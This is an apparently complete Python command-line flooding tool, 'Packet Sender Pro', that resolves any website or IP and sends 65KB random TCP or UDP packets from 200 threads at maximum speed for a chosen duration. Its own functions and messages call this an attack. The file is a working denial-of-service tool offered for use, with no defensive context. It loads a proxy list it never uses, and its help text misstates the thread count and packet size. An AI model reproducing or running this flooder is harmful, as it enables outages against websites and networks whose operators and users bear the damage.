#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
import re
from datetime import datetime

class PacketSenderCLI:
    def __init__(self):
        self.is_sending = False
        self.packets_sent = 0
        self.proxies = []
        self.errors = 0
        
    def load_proxies(self, filename="proxies.txt.txt"):
        """Load proxies from file"""
        try:
            with open(filename, "r") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.proxies)} proxies")
            return True
        except Exception as e:
            print(f"[-] Failed to load proxies: {e}")
            return False
    
    def resolve_target(self, target):
        """Resolve domain name to IP address"""
        target = target.strip()
        target = re.sub(r'^https?://', '', target)
        target = target.split('/')[0]
        target = target.split(':')[0]
        
        try:
            socket.inet_aton(target)
            return target
        except socket.error:
            try:
                ip = socket.gethostbyname(target)
                print(f"[+] Resolved {target} to {ip}")
                return ip
            except socket.gaierror:
                raise Exception(f"Could not resolve hostname: {target}")
    
    def send_packets(self, ip, port, packet_size, protocol):
        """Send packets to target"""
        while self.is_sending:
            sock = None
            try:
                data = random._urandom(packet_size)
                
                if protocol.upper() == "TCP":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    
                    try:
                        sock.connect((ip, port))
                        sock.send(data)
                    except (socket.timeout, ConnectionRefusedError, OSError):
                        self.errors += 1
                    finally:
                        try:
                            sock.shutdown(socket.SHUT_RDWR)
                        except:
                            pass
                        sock.close()
                else:  # UDP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(data, (ip, port))
                    sock.close()
                
                self.packets_sent += 1
                # NO DELAY - MAXIMUM SPEED
                
            except Exception as e:
                self.errors += 1
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    def print_stats(self):
        """Print statistics periodically"""
        while self.is_sending:
            time.sleep(2)
            print(f"\r[*] Packets Sent: {self.packets_sent} | Errors: {self.errors}", end="", flush=True)
    
    def start_attack(self, target, port, protocol, duration):
        """Start sending packets"""
        try:
            ip = self.resolve_target(target)
        except Exception as e:
            print(f"[-] Error: {e}")
            return
        
        packet_size = 65000  # 65KB packets
        threads = 200  # 200 threads for maximum throughput
        
        print(f"\n[+] Target: {target} ({ip}:{port})")
        print(f"[+] Protocol: {protocol}")
        print(f"[+] Duration: {duration} seconds")
        print(f"[+] Packet Size: {packet_size} bytes")
        print(f"[+] Threads: {threads}")
        print(f"[+] Starting attack...\n")
        
        self.is_sending = True
        self.packets_sent = 0
        self.errors = 0
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats, daemon=True)
        stats_thread.start()
        
        # Start sender threads
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self.send_packets, args=(ip, port, packet_size, protocol), daemon=True)
            t.start()
            threads_list.append(t)
        
        try:
            time.sleep(duration)
            self.stop_attack()
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop sending packets"""
        print("\n\n[+] Attack completed!")
        self.is_sending = False
        time.sleep(1)
        print(f"[+] Total Packets Sent: {self.packets_sent}")
        print(f"[+] Total Errors: {self.errors}")

def print_banner():
    """Print banner"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║           PACKET SENDER PRO - CLI EDITION                 ║
║                  TCP/UDP Packet Flooder                   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)

def print_help():
    """Print help menu"""
    help_text = """
╔═══════════════════════════════════════════════════════════╗
║                      COMMAND HELP                         ║
╚═══════════════════════════════════════════════════════════╝

Available Commands:

  UDP <ip> <port> <time>
      Send UDP packets to target
      Example: UDP 192.168.1.1 80 60

  TCP <ip/website> <port> <time>
      Send TCP packets to target
      Example: TCP example.com 443 60
      Example: TCP https://example.com/ 443 30

  HELP
      Show this help menu

  EXIT or QUIT
      Exit the program

Parameters:
  <ip/website>  - Target IP address or website URL
  <port>        - Target port (1-65535)
  <time>        - Attack duration in seconds

Notes:
  - Website URLs will be automatically resolved to IP
  - You can use http:// or https:// in URLs
  - Press Ctrl+C to stop an attack early
  - Default: 10 threads, 1024 byte packets

"""
    print(help_text)

def main():
    print_banner()
    
    sender = PacketSenderCLI()
    sender.load_proxies()
    
    print("\nType 'HELP' for available commands\n")
    
    while True:
        try:
            command = input("PacketSender> ").strip()
            
            if not command:
                continue
            
            parts = command.split()
            cmd = parts[0].upper()
            
            if cmd == "HELP":
                print_help()
            
            elif cmd == "EXIT" or cmd == "QUIT":
                print("[+] Goodbye!")
                sys.exit(0)
            
            elif cmd == "UDP":
                if len(parts) != 4:
                    print("[-] Usage: UDP <ip> <port> <time>")
                    print("[-] Example: UDP 192.168.1.1 80 60")
                    continue
                
                try:
                    target = parts[1]
                    port = int(parts[2])
                    duration = int(parts[3])
                    
                    if port < 1 or port > 65535:
                        print("[-] Port must be between 1 and 65535")
                        continue
                    
                    if duration < 1:
                        print("[-] Duration must be at least 1 second")
                        continue
                    
                    sender.start_attack(target, port, "UDP", duration)
                    
                except ValueError:
                    print("[-] Invalid port or time value")
            
            elif cmd == "TCP":
                if len(parts) != 4:
                    print("[-] Usage: TCP <ip/website> <port> <time>")
                    print("[-] Example: TCP example.com 443 60")
                    continue
                
                try:
                    target = parts[1]
                    port = int(parts[2])
                    duration = int(parts[3])
                    
                    if port < 1 or port > 65535:
                        print("[-] Port must be between 1 and 65535")
                        continue
                    
                    if duration < 1:
                        print("[-] Duration must be at least 1 second")
                        continue
                    
                    sender.start_attack(target, port, "TCP", duration)
                    
                except ValueError:
                    print("[-] Invalid port or time value")
            
            else:
                print(f"[-] Unknown command: {cmd}")
                print("[-] Type 'HELP' for available commands")
        
        except KeyboardInterrupt:
            print("\n[!] Use 'EXIT' or 'QUIT' to exit the program")
            continue
        except EOFError:
            print("\n[+] Goodbye!")
            sys.exit(0)

if __name__ == "__main__":
    main()
